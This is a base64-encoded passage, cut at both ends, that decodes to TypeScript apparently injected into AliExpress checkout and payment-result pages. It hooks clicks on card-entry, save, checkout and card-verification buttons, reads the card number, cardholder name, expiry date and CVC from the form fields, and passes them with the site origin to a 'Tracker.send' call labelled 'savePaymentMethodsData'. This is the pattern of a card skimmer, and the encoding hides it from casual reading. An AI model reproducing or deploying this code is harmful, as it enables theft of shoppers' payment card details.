YWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBfX2RldGVjdGVkRWxlbWVudC50ZXh0Q29udGVudCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ2NvbmZpcm1fb3JkZXIuaHRtJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsMDAgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnBheS10eXBlLnNob3ctbWV0aG9kJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMDApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcucGF5LXR5cGUuc2hvdy1tZXRob2QnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwzID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudE5ld0NhcmQoc2VsZixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSBhcyBIVE1MRWxlbWVudCksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiAoZWxlbWVudHM6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kU3RvcmU6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5zYXZlJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChlbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IGVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogZWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndHlwZSc6IGVsZW1lbnQudHlwZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBlbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2RTdG9yZVswXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzJdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZFN0b3JlWzNdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1jYXJkJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWNhcmQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgX19pbnRlcnZhbDMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuYXJyb3ctY29udGVudCcpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmFycm93LWNvbnRlbnQnKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2RldGVjdGVkRGl2RWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWREaXZFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19kZXRlY3RlZERpdkVsZW1lbnQuY2xhc3NMaXN0LmNvbnRhaW5zKCdhcnJvdy1kb3duJykpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBfX2ludGVydmFsMiA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmFkZC1uZXctY2FyZCcpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoX19pbnRlcnZhbDIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5hZGQtbmV3LWNhcmQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBfX2ludGVydmFsMyA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5uZXctY2FyZCcpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5taXgtZWRjYXJkLWl0ZW0nKT8uY2hpbGRFbGVtZW50Q291bnQgIT09IDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBjYXJkQ29uZmlybUVsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2hlY2tvdXQtYnV0dG9uJyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkQ29uZmlybUVsZW1lbnQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm1peC1lZGNhcmQtaXRlbScpPy5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSA9PT0gJ1NQQU4nICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdpY29uJykpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ3Zpc2EnKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiAndmlzYSdcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkubm9kZU5hbWUgPT09ICdTUEFOJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygncGF5LW5hbWUnKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnRleHRDb250ZW50XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzFdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZigncGF5UmVzdWx0Lmh0bScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWw0ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtY29uZmlybScpPy5maXJzdEVsZW1lbnRDaGlsZD8ubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1jb25maXJtJyk/LmZpcnN0RWxlbWVudENoaWxkPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtZm9ybS1yb3cnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdjYXJkTicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtZm9ybS1yb3cnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdjYXJkSG9sZGVyJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTcGVjaWZpY0VsZW1lbnRCeVRhZ05hbWUoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2lucHV0JywgJ2V4cGlyZXMnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI